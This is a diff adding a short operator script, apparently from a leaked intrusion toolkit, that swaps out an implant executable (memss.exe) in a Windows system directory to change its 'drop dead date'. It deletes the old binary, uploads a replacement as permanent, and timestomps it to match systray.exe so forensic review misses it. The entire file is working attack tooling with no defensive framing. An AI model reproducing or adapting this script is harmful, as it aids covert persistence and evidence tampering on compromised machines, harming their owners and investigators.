@@ -1,0 +1,75 @@
+#--------------------------------------------------------
+# File: UpdateExe.eps
+#
+# Wrapper script to change the drop dead date
+#
+# Modifications:
+#  11/18/2002	Created.
+#  02/03/2004	Updated to use module calls
+#--------------------------------------------------------
+@include "_GetSystemPaths.epm";
+
+@echo off;
+
+if (($argc != 2) && ($argc != 3)) {
+    echo "Usage: $argv[0] <driverName> [localExe]";
+    return false;
+}
+
+string $driver = $argv[1];
+string $exeName = "memss.exe";
+string $localExe;
+if ($argc == 3) {
+    $localExe = $argv[2];
+}
+
+# get the system directory
+string $root;
+string $sys;
+ifnot (_GetSystemPaths($root, $sys)) {
+    echo "Unable to determine root directory\n";
+    return false;
+}
+string $sysDir = "$root\\$sys";
+
+ifnot (defined($localExe)) {
+    # user needs to provide input
+    $localExe = GetInput("Enter the local path to $exeName");
+    ifnot (defined($localExe)) {
+	echo "Invalid path to $exeName";
+	return false;
+    }
+
+    ifnot (prompt "Continue?") {
+	return false;
+    }
+}
+
+# delete the old executable
+echo "Deleting old $exeName";
+if (`del $exeName -path "$sysDir"`) {
+    echo "    DELETED";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+# put the new executable
+echo "Uploading new $exeName";
+if (`put "$localExe" -name "$sysDir\\$exeName" -permanent`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+# match file times for exe
+echo "Matching file time for EXE";
+if (`matchtimes "$sysDir\\systray.exe" "$sysDir\\$exeName"`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED (but continuing anyway)";
+}
+
+# we're done...
+return true;
